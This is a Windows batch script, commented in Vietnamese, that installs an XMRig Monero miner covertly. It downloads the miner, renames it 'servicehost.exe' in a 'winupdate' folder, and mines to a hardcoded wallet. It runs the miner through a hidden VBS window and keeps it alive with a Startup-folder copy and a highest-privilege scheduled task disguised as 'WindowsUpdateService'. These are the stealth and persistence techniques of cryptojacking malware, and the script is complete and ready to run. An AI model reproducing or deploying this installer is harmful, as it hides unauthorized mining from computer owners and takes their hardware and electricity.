@echo off
title Cai dat AutoRun FIXED
setlocal

:: Cau hinh
set WALLET=47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL
set RIG=%COMPUTERNAME%
set INSTALL_DIR=D:\winupdate
set FAKE_EXE=servicehost.exe
set VBS_FILE=winup.vbs
set TASK_NAME=WindowsUpdateService
set ZIP_URL=https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-gcc-win64.zip
set STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

:: Tao thu muc
mkdir "%INSTALL_DIR%" 2>nul
cd /d "%INSTALL_DIR%"

:: Tai va giai nen
curl -L -o miner.zip %ZIP_URL%
tar -xf miner.zip

:: Doi ten folder va file
for /d %%F in ("xmrig-*") do (
    move "%%F" "bin" >nul
)
cd bin
rename xmrig.exe %FAKE_EXE%

:: Tao start.bat
(
echo @echo off
echo cd /d "%INSTALL_DIR%\bin"
echo start /min %FAKE_EXE% -o pool.supportxmr.com:3333 -u %WALLET% -k --rig-id %RIG%
) > "%INSTALL_DIR%\start.bat"

:: Tao VBS chay an
(
echo Set WshShell = CreateObject("WScript.Shell"^)
echo WshShell.Run chr(34^) ^& "%INSTALL_DIR%\start.bat" ^& Chr(34^), 0
echo Set WshShell = Nothing
) > "%INSTALL_DIR%\%VBS_FILE%"

:: Tao file copy_to_startup.bat
(
echo @echo off
echo copy "%INSTALL_DIR%\%VBS_FILE%" "%STARTUP_FOLDER%\%VBS_FILE%" /Y
) > "%INSTALL_DIR%\copy_to_startup.bat"

:: Copy ngay shortcut vao Startup
copy "%INSTALL_DIR%\%VBS_FILE%" "%STARTUP_FOLDER%\%VBS_FILE%" /Y

:: Tao Scheduled Task chay startup
schtasks /Create ^
 /TN "%TASK_NAME%" ^
 /TR "\"%INSTALL_DIR%\copy_to_startup.bat\"" ^
 /SC ONSTART ^
 /RL HIGHEST ^
 /F >nul

:: Chay miner lan dau
echo [+] Dang chay miner lan dau...
cscript //nologo "%INSTALL_DIR%\%VBS_FILE%"

echo.
echo [OK] Cai dat hoan tat. Miner se tu chay an khi khoi dong.
pause
